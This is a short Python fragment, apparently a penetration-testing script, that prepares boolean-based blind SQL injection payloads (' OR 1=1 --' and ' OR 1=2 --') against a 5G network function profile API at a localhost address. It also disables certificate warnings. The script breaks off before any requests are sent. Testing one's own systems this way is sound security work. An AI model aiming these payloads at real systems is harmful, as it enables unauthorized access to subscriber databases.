import requests
import urllib3
import json
import time

#Desabilitar avisos de certificados autoassinados para ambientes de teste
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#Configurações do teste
NF_API_URL = "https://127.0.0.1:29503/api/profile" #Exemplo de URL de API da NF (substituir)
TARGET_PARAMETER = "id"
HEADERS = {"Content-Type": "application/json"}
TEST_SUPI = "imsi-208930000000001"

print("[+] Testando SQL Injection (Boolean-based blind)...")

#Payload de controle (requisição válido)
payload_control = {TARGET_PARAMETER: f"'{TEST_SUPI}'"}

#Payload verdadeiro (' OR 1=1)
payload_true = {TARGET_PARAMETER: f"'{TEST_SUPI}' OR 1=1 --"}

#Payload falso (' OR 1=2)
payload_false = {TARGET_PARAMETER: f"'{TEST_SUPI}' OR 1=2 --"}